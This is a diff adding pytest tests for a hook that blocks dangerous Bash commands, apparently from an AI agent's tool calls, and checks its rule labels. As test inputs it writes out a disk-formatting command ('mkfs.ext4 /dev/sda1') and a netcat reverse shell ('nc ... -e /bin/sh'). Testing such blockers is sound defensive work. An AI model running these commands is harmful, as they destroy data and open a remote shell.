@@ -172,3 +172,46 @@ def test_invalid_json_stdin_does_not_crash():
     )
 
     assert proc.returncode == 0
+
+
+def _load_module():
+    import importlib.util
+
+    source = (
+        Path(__file__).resolve().parents[3] / "hooks" / "dangerous-command-blocker.py"
+    )
+    spec = importlib.util.spec_from_file_location("dangerous_command_blocker", source)
+    module = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(module)
+    return module
+
+
+def test_catastrophic_block_names_the_matched_rule(tool_use, assert_blocks):
+    payload = tool_use("Bash", {"command": "mkfs" + ".ext4 /dev/sda1"})
+
+    _code, stderr = assert_blocks(HOOK, payload, "format filesystem")
+
+    assert "BLOCKED" in stderr
+
+
+def test_reverse_shell_block_names_the_matched_rule(tool_use, assert_blocks):
+    payload = tool_use("Bash", {"command": "nc 10.0.0.1 4444 -e /bin/" + "sh"})
+
+    assert_blocks(HOOK, payload, "netcat reverse shell")
+
+
+def test_every_pattern_carries_a_human_readable_label():
+    module = _load_module()
+
+    for table in (module.CATASTROPHIC, module.SAFE_CLEANUP):
+        for pattern, label in table:
+            assert pattern, label
+            assert label and not label.startswith("\\b"), pattern
+
+
+def test_labels_are_unique_within_each_table():
+    module = _load_module()
+
+    for table in (module.CATASTROPHIC, module.SAFE_CLEANUP):
+        labels = [label for _pattern, label in table]
+        assert len(labels) == len(set(labels)), sorted(labels)
